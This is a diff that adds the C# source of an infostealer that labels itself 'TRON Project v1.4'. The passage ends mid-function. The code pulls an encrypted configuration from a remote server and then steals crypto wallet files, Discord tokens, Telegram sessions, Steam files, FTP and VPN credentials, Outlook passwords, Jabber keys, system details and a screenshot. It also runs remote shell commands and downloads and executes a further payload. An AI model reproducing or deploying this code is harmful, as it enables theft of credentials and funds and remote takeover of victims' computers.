@@ -1,0 +1,1541 @@
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Drawing;
+using System.Linq;
+
+namespace TRONRANDOM_NAME
+{
+    class TRONRANDOM_CLASS
+    {
+        public static string TRON_ip = null;
+
+        public static object TRON_copy_files_dir = TRONRANDOM_NAME.TRON_Helper.TRON_random_path() + "\\" + TRONRANDOM_NAME.TRON_Helper.TRON_random_string();
+
+        public static Dictionary<string, byte[]> TRON_ziplist = new Dictionary<string, byte[]>();
+
+        public static object[] TRONRANDOM_Start()
+        {
+            try
+            {
+                TRONRANDOM_NAME.TRON_Helper.TRON_extractsql();
+
+                Thread TRON_thread = new Thread(TRONRANDOM_NAME.TRON_Grabber.TRON_Start);
+                TRON_thread.Start();
+                TRON_thread.Join();
+
+                return new object[] { TRON_ziplist, TRON_ip };
+            }
+            catch
+            {
+            }
+
+            return null;
+        }
+
+    }
+
+    class TRON_Grabber
+    {
+        public static void TRON_Start()
+        {
+            ThreadStart[] TRON_threads = new ThreadStart[10];
+            string TRON_cfg = null;
+            string TRON_basic_settings = null;
+            string TRON_user_rules = null;
+            string TRON_loader = null;
+            string TRON_cmd = null;
+
+            try
+            {
+                System.Net.HttpWebRequest TRON_http = (System.Net.HttpWebRequest)System.Net.WebRequest.Create((string)TRONRANDOM_NAME.TRON_Helper.TRON_dcr("[cfg]"));
+                TRON_http.UseDefaultCredentials = true;
+                TRON_http.Timeout = 1000;
+                System.Net.HttpWebResponse TRON_response = (System.Net.HttpWebResponse)TRON_http.GetResponse();
+
+                TRON_cfg = new StreamReader(TRON_response.GetResponseStream()).ReadToEnd().Trim();
+                TRON_response.Close();
+
+                TRON_cfg = TRONRANDOM_NAME.TRON_Helper.TRON_XORCipher(Encoding.UTF8.GetString(Convert.FromBase64String(TRON_cfg)), "[xor_decrypt]");
+            }
+            catch
+            {
+                Environment.Exit(0);
+            }
+
+            try
+            {
+                TRON_basic_settings = Encoding.UTF8.GetString(Convert.FromBase64String(TRON_cfg.Split('$')[0]));
+                TRON_user_rules = Encoding.UTF8.GetString(Convert.FromBase64String(TRON_cfg.Split('$')[1]));
+                TRON_loader = Encoding.UTF8.GetString(Convert.FromBase64String(TRON_cfg.Split('$')[2]));
+                TRON_cmd = Encoding.UTF8.GetString(Convert.FromBase64String(TRON_cfg.Split('$')[3]));
+
+            }
+            catch
+            { }
+
+            
+            if (TRON_basic_settings.Length > 0)
+            {
+                Thread TRON_Browsers = new Thread(new ParameterizedThreadStart(TRONRANDOM_NAME.TRON_Browsers.TRON_s7));
+
+                if (TRON_basic_settings[0] == '1')
+                    TRON_Browsers.Start(true);
+                else
+                    TRON_Browsers.Start(false);
+
+                TRON_Browsers.Join();
+
+                if (TRON_basic_settings[1] == '1')
+                    TRON_threads[1] = TRONRANDOM_NAME.TRON_Grabber.TRON_Crypto;
+
+                if (TRON_basic_settings[2] == '1')
+                    TRON_threads[2] = TRONRANDOM_NAME.TRON_Grabber.TRON_Steam;
+
+                if (TRON_basic_settings[3] == '1')
+                    TRON_threads[3] = TRONRANDOM_NAME.TRON_Grabber.TRON_Telegram;
+
+                if (TRON_basic_settings[4] == '1')
+                    TRON_threads[4] = TRONRANDOM_NAME.TRON_Grabber.TRON_FTP;
+
+                if (TRON_basic_settings[5] == '1')
+                    TRON_threads[5] = TRONRANDOM_NAME.TRON_Grabber.TRON_VPN;
+
+                if (TRON_basic_settings[6] == '1')
+                    TRON_threads[6] = TRONRANDOM_NAME.TRON_Grabber.TRON_Discord;
+
+                if (TRON_basic_settings[7] == '1')
+                    TRON_threads[7] = TRONRANDOM_NAME.TRON_Grabber.TRON_Jabber;
+
+                if (TRON_basic_settings[8] == '1')
+                    TRON_threads[8] = TRONRANDOM_NAME.TRON_Grabber.TRON_Outlook;
+
+                if (TRON_basic_settings[9] == '1')
+                    TRON_threads[9] = TRONRANDOM_NAME.TRON_Grabber.TRON_Info_less;
+                else
+                    TRON_threads[9] = TRONRANDOM_NAME.TRON_Grabber.TRON_Info;
+
+                // Запуск потоков в рандомном порядке
+                TRONRANDOM_NAME.TRON_Helper.TRON_random_threads(TRON_threads);
+
+                for (int i = 1; i < TRON_threads.Length; i++)
+                {
+                    try
+                    {
+                        Thread TRON_thread = new Thread(TRON_threads[i]);
+                        TRON_thread.Start();
+                        TRON_thread.Join();
+                    }
+                    catch
+                    { }
+
+                }
+
+            }
+
+            
+			// Парсим правила пользователя
+            if (TRON_user_rules.Length > 0)
+            {
+                List<string> TRON_files = new List<string>();
+
+                string[] TRON_rules = TRON_user_rules.Split('$');
+
+                for (int i = 0; i < TRON_rules.Length - 1; i++)
+                {
+                    string TRON_path = TRON_rules[i].Split('+')[1];
+                    if (TRON_path.Split('\\')[0].Equals("APPDATA"))
+                        TRON_path = Path.Combine(TRON_path.Replace("APPDATA", TRONRANDOM_NAME.TRON_Helper.TRON_appdata));
+                    else if (TRON_path.Split('\\')[0].Equals("LOCALAPPDATA"))
+                        TRON_path = Path.Combine(TRON_path.Replace("LOCALAPPDATA", TRONRANDOM_NAME.TRON_Helper.TRON_localappdata));
+                    else if (TRON_path.Split('\\')[0].Equals("USERPROFILE"))
+                        TRON_path = Path.Combine(TRON_path.Replace("USERPROFILE", TRONRANDOM_NAME.TRON_Helper.TRON_user));
+                    else if (TRON_path.Split('\\')[0].Equals("SYSTEMDRIVE"))
+                        TRON_path = Path.Combine(TRON_path.Replace("SYSTEMDRIVE", TRONRANDOM_NAME.TRON_Helper.TRON_sysdrive));
+                    else if (TRON_path.Split('\\')[0].Equals("PROGRAMFILES"))
+                        TRON_path = Path.Combine(TRON_path.Replace("PROGRAMFILES", TRONRANDOM_NAME.TRON_Helper.TRON_progfiles));
+                    else if (TRON_path.Split('\\')[0].Equals("PROGRAMFILES(X86)"))
+                        TRON_path = Path.Combine(TRON_path.Replace("PROGRAMFILES(X86)", TRONRANDOM_NAME.TRON_Helper.TRON_progfiles86));
+
+
+                    foreach (var TRON_item in TRONRANDOM_NAME.TRON_Helper.TRON_GetFiles(TRON_path, TRON_rules[i].Split('+')[2].Split(';'), (TRON_rules[i].Split('+')[3].Equals("0") ? false : true), TRON_rules[i].Split('+')[4]))
+                    {
+                        try
+                        {
+                            TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add(Path.Combine(TRON_rules[i].Split('+')[0] + "\\" + TRON_item.Replace(TRON_path, "")), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_item));
+
+                        }
+                        catch
+                        { }
+                    }
+
+                }
+            }
+
+
+            if (TRON_cmd.Length > 0)
+                if (TRON_cmd != "none")
+                    TRON_shell(TRON_cmd);
+
+
+            if (TRON_loader.Length > 0)
+                if (TRON_loader != "none")
+                    TRON_Loader(TRON_loader);
+
+        }
+
+        static void TRON_Loader(object TRON_link)
+        {
+            try
+            {
+                string TRON_filename = TRONRANDOM_NAME.TRON_Helper.TRON_programdata + "\\" + Path.GetRandomFileName().Replace(".", string.Empty) + ".exe";
+                byte[] TRON_bytes = new System.Net.WebClient().DownloadData((string)TRON_link);
+                File.WriteAllBytes(TRON_filename, TRON_bytes);
+                Process.Start(TRON_filename);
+            }
+            catch
+            { }
+        }
+
+        static void TRON_shell(object TRON_cmd)
+        {
+            try
+            {
+                Process TRON_ps = new Process();
+                TRON_ps.StartInfo.FileName = "cmd.exe";
+                TRON_ps.StartInfo.Arguments = "/C " + TRON_cmd;
+                TRON_ps.StartInfo.CreateNoWindow = true;
+                TRON_ps.StartInfo.UseShellExecute = false;
+                TRON_ps.StartInfo.RedirectStandardOutput = true;
+                TRON_ps.Start();
+
+                string TRON_data = TRON_ps.StandardOutput.ReadToEnd();
+
+                TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("cmd.txt", Encoding.UTF8.GetBytes(">" + TRON_cmd + "\n" + TRON_data));
+            }
+            catch
+            { }
+
+        }
+
+        static void TRON_FTP()
+        {
+            try
+            {
+                string[] TRON_files = {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\FileZilla\\sitemanager.xml",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\FileZilla\\recentservers.xml"
+                };
+
+
+                foreach (var TRON_item in TRON_files)
+                {
+                    if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_item))
+                    {
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("FTP\\FileZilla\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_item), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_item));
+
+                    }
+                }
+
+
+                if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRON_Helper.TRON_appdata + "\\SmartFTP"))
+                {
+                    foreach (var TRON_item in TRONRANDOM_NAME.TRON_Helper.TRON_GetFiles(TRON_Helper.TRON_appdata + "\\SmartFTP", new string[] { "*.dat" }, true, "none"))
+                    {
+                        if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_item))
+                        {
+                            try
+                            {
+                                TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("FTP\\SmartFTP\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_item), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_item));
+
+                            }
+                            catch
+                            { }
+
+                        }
+                    }
+                }
+
+
+            }
+            catch
+            { }
+        }
+
+        static void TRON_Steam()
+        {
+            try
+            {
+                string TRON_path = TRONRANDOM_NAME.TRON_Helper.TRON_GetRegKey("Software\\Valve\\Steam", "SteamPath").ToString();
+                if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRON_path))
+                {
+
+                    if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path + "\\config\\config.vdf"))
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Steam\\config\\config.vdf", TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_path + "\\config\\config.vdf"));
+
+                    if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path + "\\config\\loginusers.vdf"))
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Steam\\config\\loginusers.vdf", TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_path + "\\config\\loginusers.vdf"));
+
+                    string[] TRON_files = Directory.GetFiles(TRON_path, "ssfn*");
+
+                    foreach (string TRON_f1les in TRON_files)
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Steam\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_f1les), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_f1les));
+
+                }
+            }
+            catch
+            { }
+
+        }
+
+        static void TRON_Info()
+        {
+            
+            string info = null;
+            try
+            {
+                TRONRANDOM_CLASS.TRON_ip = TRONRANDOM_NAME.TRON_Helper.TRON_getip().ToString();
+
+                info += "############# [TRON Project v1.4] #############" + "\n\n";
+                info += "-IP: " + TRONRANDOM_CLASS.TRON_ip + "\n";
+                info += "-UserName: " + Environment.UserName + "\n";
+                info += "-MachineName: " + Environment.MachineName + "\n";
+                info += "-OS: " + TRONRANDOM_NAME.TRON_Helper.TRON_os() + "\n";
+                info += "-AV: " + TRONRANDOM_NAME.TRON_Helper.TRON_av() + "\n";
+                info += "-CPU: " + TRONRANDOM_NAME.TRON_Helper.TRON_cpu() + "\n";
+                info += "-GPU: " + TRONRANDOM_NAME.TRON_Helper.TRON_gpu() + "\n";
+                info += "-Screen resolution: " + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height.ToString() + "\n";
+                info += "-Languages: " + TRONRANDOM_NAME.TRON_Helper.TRON_langs() + "\n";
+                info += "-LocalTime: " + DateTime.Now.ToString() + "\n";
+                info += "-Path: " + TRONRANDOM_NAME.TRON_Helper.TRON_location() + "\n\n";
+
+                info += "-Processes:\n";
+
+                foreach (var item in System.Diagnostics.Process.GetProcesses())
+                    info += "--" + item.ProcessName + ".exe (" + item.Id + ")\n";
+
+
+                TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("info.txt", Encoding.UTF8.GetBytes(info));
+
+                TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("screen.png", TRONRANDOM_NAME.TRON_Helper.TRON_screen());
+
+            }
+            catch
+            {
+            }
+        }
+
+        static void TRON_Info_less()
+        {
+			// Этот метод собирает инфу без WMI
+            string info = null;
+            try
+            {
+                TRONRANDOM_CLASS.TRON_ip = TRONRANDOM_NAME.TRON_Helper.TRON_getip().ToString();
+
+                info += "############# [TRON Project v1.4] #############" + "\n\n";
+                info += "-IP: " + TRONRANDOM_CLASS.TRON_ip + "\n";
+                info += "-UserName: " + Environment.UserName + "\n";
+                info += "-OS: " + Environment.OSVersion + " | " + (Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit") + "\n";
+                info += "-Screen resolution: " + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height.ToString() + "\n";
+                info += "-Languages: " + TRONRANDOM_NAME.TRON_Helper.TRON_langs() + "\n";
+                info += "-LocalTime: " + DateTime.Now.ToString() + "\n";
+                info += "-Path: " + TRONRANDOM_NAME.TRON_Helper.TRON_location() + "\n\n";
+
+                TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("info.txt", Encoding.UTF8.GetBytes(info));
+
+                TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("screen.png", TRONRANDOM_NAME.TRON_Helper.TRON_screen());
+            }
+            catch
+            {
+            }
+        }
+
+        static void TRON_VPN()
+        {
+            try
+            {
+
+                if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\NordVPN"))
+                {
+
+                    string[] TRON_files = Directory.GetFiles(TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\NordVPN", "user.config", SearchOption.AllDirectories);
+
+                    foreach (string TRON_f1le in TRON_files)
+                    {
+                        if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_f1le))
+                        {
+                            System.Xml.XmlDocument s6 = new System.Xml.XmlDocument();
+                            s6.Load(TRON_f1le);
+
+                            object TRON_login = Encoding.UTF8.GetString(System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(s6.SelectSingleNode("//setting[@name='Username']/value").InnerText), null, System.Security.Cryptography.DataProtectionScope.CurrentUser));
+                            object TRON_pwd = Encoding.UTF8.GetString(System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(s6.SelectSingleNode("//setting[@name='Password']/value").InnerText), null, System.Security.Cryptography.DataProtectionScope.CurrentUser));
+
+                            if (TRON_login.ToString().Length > 0 && TRON_pwd.ToString().Length > 0)
+                                TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("VPN\\NordVPN\\NordVPN.txt", Encoding.UTF8.GetBytes("NordVPN " + TRONRANDOM_NAME.TRON_Helper.TRON_DirName(Path.GetDirectoryName(TRON_f1le)) + " | " + TRON_login + " | " + TRON_pwd));
+
+                        }
+                    }
+                }
+
+
+            }
+            catch
+            { }
+
+        }
+
+        static void TRON_Discord()
+        {
+            try
+            {
+                if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\discord\\Local Storage\\leveldb"))
+                {
+
+                    foreach (var TRON_item in TRONRANDOM_NAME.TRON_Helper.TRON_GetFiles(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\discord\\Local Storage\\leveldb", new string[] { "00*" }, false, "none"))
+                    {
+                        string TRON_token = new Regex("\"[A-Za-z0-9.]{59}\"").Match(File.ReadAllText(TRON_item, Encoding.UTF8)).Value.Replace("\"", ""); ;
+
+                        if (TRON_token.Length > 1)
+                            TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Discord\\Token.txt", Encoding.UTF8.GetBytes(TRON_token));
+
+                    }
+                }
+
+            }
+            catch
+            { }
+        }
+
+        static void TRON_Telegram()
+        {
+            try
+            {
+
+                if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Telegram Desktop\\tdata"))
+                {
+                    string TRON_path = Directory.GetDirectories(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Telegram Desktop\\tdata", "D877*")[0];
+
+                    if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRON_path))
+                    {
+
+                        string TRON_f1le = Directory.GetFiles(TRON_path, "map*", SearchOption.TopDirectoryOnly)[0];
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Telegram\\" + TRONRANDOM_NAME.TRON_Helper.TRON_DirName(TRON_path) + "\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_f1le), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_f1le));
+
+                        string TRON_f1le2 = Directory.GetFiles(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Telegram Desktop\\tdata", "D877*", SearchOption.TopDirectoryOnly)[0];
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Telegram\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_f1le2), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_f1le2));
+
+                    }
+
+                }
+            }
+            catch { }
+        }
+
+        static void TRON_Jabber()
+        {
+            try
+            {
+
+                string[] TRON_files =
+                {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\.purple\\",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Psi\\profiles\\default\\",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Psi+\\profiles\\default\\"
+
+                };
+
+                string[] TRON_files2 = { "accounts.xml", "otr.fingerprints", "otr.keys", "otr.private_key" };
+
+                for (int i = 0; i < TRON_files.Length; i++)
+                {
+                    if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRON_files[i]))
+                    {
+                        try
+                        {
+                            for (int f = 0; f < TRON_files2.Length; f++)
+                                if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_files[i] + TRON_files2[f]))
+                                    TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Jabber\\" + TRONRANDOM_NAME.TRON_Helper.TRON_DirName(TRON_files[i]) + "\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_files2[f]), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_files[i] + TRON_files2[f]));
+
+
+                        }
+                        catch
+                        { }
+
+                    }
+                }
+            }
+            catch
+            { }
+        }
+
+        static void TRON_Crypto()
+        {
+            try
+            {
+                string[] TRON_files =
+                {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata  + "\\Electrum\\wallets\\default_wallet",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata  + "\\Exodus\\exodus.wallet\\info.seco",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata  + "\\Exodus\\exodus.wallet\\seed.seco",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata  + "\\Exodus\\exodus.wallet\\passphrase.json",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_appdata  + "\\Ethereum\\keystore",
+                    TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Coinomi\\Coinomi\\wallet"
+
+                };
+
+                for (int TRON_i = 0; TRON_i < TRON_files.Length; TRON_i++)
+                {
+                    try
+                    {
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Crypto\\" + TRON_Helper.TRON_DirMatch(TRON_files[TRON_i]) + "\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_files[TRON_i]), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_files[TRON_i]));
+
+                    }
+                    catch
+                    { }
+
+                }
+
+                if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\MyMonero"))
+                {
+                    string[] TRON_monero =
+                    {
+                        "FundsRequests*",
+                        "PasswordMeta*",
+                        "Settings*",
+                        "Wallets*"
+                    };
+
+                    foreach (var TRON_item in TRONRANDOM_NAME.TRON_Helper.TRON_GetFiles(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\MyMonero", TRON_monero, false, "none"))
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Crypto\\MyMonero\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_item), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_item));
+
+                }
+
+                if (TRONRANDOM_NAME.TRON_Helper.TRON_DExist(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\atomic\\Local Storage\\leveldb"))
+                    foreach (var TRON_item in Directory.GetFiles(TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\atomic\\Local Storage\\leveldb"))
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Crypto\\atomic\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_item), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRON_item));
+
+
+            }
+            catch
+            { }
+
+        }
+
+        static void TRON_Outlook()
+        {
+            try
+            {
+                string TRON_creds = null;
+
+                string[] TRON_paths = new string[]
+                {
+                "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
+                "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
+                "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
+                "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
+                };
+
+                string[] TRON_data = new string[]
+                {
+                "SMTP Email Address",
+                "SMTP Server",
+                "POP3 Server",
+                "POP3 User Name",
+                "SMTP User Name",
+                "NNTP Email Address",
+                "NNTP User Name",
+                "NNTP Server",
+                "IMAP Server",
+                "IMAP User Name",
+                "Email",
+                "HTTP User",
+                "HTTP Server URL",
+                "POP3 User",
+                "IMAP User",
+                "HTTPMail User Name",
+                "HTTPMail Server",
+                "SMTP User",
+                "POP3 Password2",
+                "IMAP Password2",
+                "NNTP Password2",
+                "HTTPMail Password2",
+                "SMTP Password2",
+                "POP3 Password",
+                "IMAP Password",
+                "NNTP Password",
+                "HTTPMail Password",
+                "SMTP Password",
+
+                };
+                
+				// Ищем подключи
+				
+                for (int TRON_i = 0; TRON_i < TRON_paths.Length; TRON_i++)
+                    TRON_creds += TRONRANDOM_NAME.TRON_Helper.TRON_OutlookRecursiveReg(TRON_paths[TRON_i], TRON_data);
+
+
+                if (TRON_creds.Length > 0)
+                    TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Mails\\Outlook.txt", Encoding.UTF8.GetBytes(TRON_creds));
+
+            }
+            catch
+            { }
+        }
+
+
+    }
+
+    class TRON_Helper
+    {
+        public static string TRON_programdata = Environment.GetEnvironmentVariable("programdata");
+        public static string TRON_appdata = Environment.GetEnvironmentVariable("appdata");
+        public static string TRON_localappdata = Environment.GetEnvironmentVariable("localappdata");
+        public static string TRON_user = Environment.GetEnvironmentVariable("userprofile");
+        public static string TRON_sysdrive = Environment.GetEnvironmentVariable("systemdrive");
+        public static string TRON_progfiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+        public static string TRON_progfiles86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
+        public static string TRON_chars = "abcdefghijklmnopqustuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+
+
+        public static object TRON_getip()
+        {
+            try
+            {
+                
+
+                System.Net.HttpWebRequest TRON_http = (System.Net.HttpWebRequest)System.Net.WebRequest.Create("http://api.ipify.org");
+                TRON_http.UseDefaultCredentials = true;
+                TRON_http.Timeout = 1000;
+                System.Net.HttpWebResponse TRON_response = (System.Net.HttpWebResponse)TRON_http.GetResponse();
+
+                string TRON_data = new StreamReader(TRON_response.GetResponseStream()).ReadToEnd().Trim();
+                TRON_response.Close();
+
+                if (new Regex(@"(?:[0-9]{1,3}\.){3}[0-9]{1,3}").IsMatch(TRON_data))
+                {
+                    return TRON_data;
+                }
+                else
+                {
+                    return "127.0.0.1";
+                }
+
+            }
+            catch
+            {
+            }
+
+            return "null";
+        }
+
+        public static byte[] TRON_screen()
+        {
+            try
+            {
+                Bitmap TRON_var = new Bitmap(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height);
+                Graphics.FromImage(TRON_var).CopyFromScreen(0, 0, 0, 0, TRON_var.Size);
+                MemoryStream TRON_ms = new MemoryStream();
+                TRON_var.Save(TRON_ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                return TRON_ms.ToArray();
+            }
+            catch
+            { }
+
+            return null;
+        }
+
+        public static object TRON_langs()
+        {
+            try
+            {
+                string TRON_retlng = null;
+                System.Windows.Forms.InputLanguageCollection TRON_lang = System.Windows.Forms.InputLanguage.InstalledInputLanguages;
+
+                for (int i = 0; i < TRON_lang.Count; i++)
+                {
+                    TRON_retlng += TRON_lang[i].Culture.EnglishName + " ";
+                }
+
+                return TRON_retlng;
+            }
+            catch
+            { }
+
+            return "null";
+        }
+
+        public static object TRON_location()
+        {
+            try
+            {
+                return System.Reflection.Assembly.GetEntryAssembly().Location;
+            }
+            catch
+            {
+            }
+
+            return "null";
+        }
+
+        public static object TRON_os()
+        {
+            try
+            {
+                System.Management.ManagementObjectSearcher TRON_searcher = new System.Management.ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
+                foreach (System.Management.ManagementObject TRON_var in TRON_searcher.Get())
+                    return TRON_var["Caption"].ToString() + " | " + TRON_var["OSArchitecture"].ToString();
+            }
+            catch
+            { }
+
+            return "null";
+        }
+
+        public static object TRON_cpu()
+        {
+            try
+            {
+                System.Management.ManagementObjectSearcher TRON_searcher = new System.Management.ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
+
+                foreach (System.Management.ManagementObject TRON_var in TRON_searcher.Get())
+                    return TRON_var["Name"].ToString();
+            }
+            catch
+            { }
+
+            return "null";
+        }
+
+        public static object TRON_gpu()
+        {
+            try
+            {
+                System.Management.ManagementObjectSearcher TRON_searcher = new System.Management.ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
+
+                foreach (System.Management.ManagementObject TRON_var in TRON_searcher.Get())
+                    return TRON_var["Name"].ToString();
+            }
+            catch
+            { }
+
+            return "null";
+        }
+
+        public static object TRON_av()
+        {
+            try
+            {
+                System.Management.ManagementObjectSearcher TRON_searcher = new System.Management.ManagementObjectSearcher(Environment.OSVersion.Version.Major >= 6 ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM AntivirusProduct");
+                string TRON_avs = null;
+                foreach (System.Management.ManagementObject TRON_var in TRON_searcher.Get())
+                    TRON_avs += TRON_var["displayName"].ToString() + " ";
+
+                return (TRON_avs.Length > 0 ? TRON_avs : "none");
+            }
+            catch
+            { }
+
+            return "null";
+        }
+
+
+        public static object TRON_random_path()
+        {
+            int TRON_Random = new Random(DateTime.Now.Millisecond).Next(0, 3);
+
+            if (TRON_Random == 0)
+                return TRON_programdata;
+            else if (TRON_Random == 1)
+                return TRON_appdata;
+            else
+                return TRON_localappdata;
+        }
+
+        public static object TRON_random_string()
+        {
+            try
+            {
+                Thread.Sleep(1);
+
+                int TRON_keyLength = new Random(DateTime.Now.Millisecond).Next(5, 10);
+                var TRON_keyspace = "abcdefghijklmnopqustuvwxyzABCDEFGHIJKLMNOPQUSTUVWXYZ".ToCharArray();
+
+                var TRON_data = new byte[1];
+                using (var TRON_crypto = new System.Security.Cryptography.RNGCryptoServiceProvider())
+                {
+                    TRON_crypto.GetNonZeroBytes(TRON_data);
+                    TRON_data = new byte[TRON_keyLength];
+                    TRON_crypto.GetNonZeroBytes(TRON_data);
+                }
+                var TRON_result = new StringBuilder(TRON_keyLength);
+                foreach (var TRON_b in TRON_data)
+                    TRON_result.Append(TRON_keyspace[TRON_b % (TRON_keyspace.Length)]);
+
+                return TRON_result.ToString();
+            }
+            catch
+            { }
+
+            return Path.GetRandomFileName().Replace(".", string.Empty);
+        }
+
+        public static void TRON_random_threads<T>(T[] arr)
+        {
+            Random s21 = new Random(DateTime.Now.Millisecond);
+
+            for (int i = arr.Length - 1; i >= 1; i--)
+            {
+                try
+                {
+                    int j = s21.Next(i + 1);
+                    T tmp = arr[j];
+                    arr[j] = arr[i];
+                    arr[i] = tmp;
+                }
+                catch
+                { }
+
+            }
+        }
+
+        
+		// Работа с ресурсами
+        public static void TRON_extractsql()
+        {
+            try
+            {
+                byte[] TRON_s18 = TRONRANDOM_NAME.TRON_Helper.TRON_decompress(TRON_decrypt("[sqlpwd]", TRONRANDOM_NAME.TRON_Helper.TRON_loadassembly("[sqldll]")));
+                byte[] TRON_s19 = Encoding.UTF8.GetBytes((string)TRON_random_string());
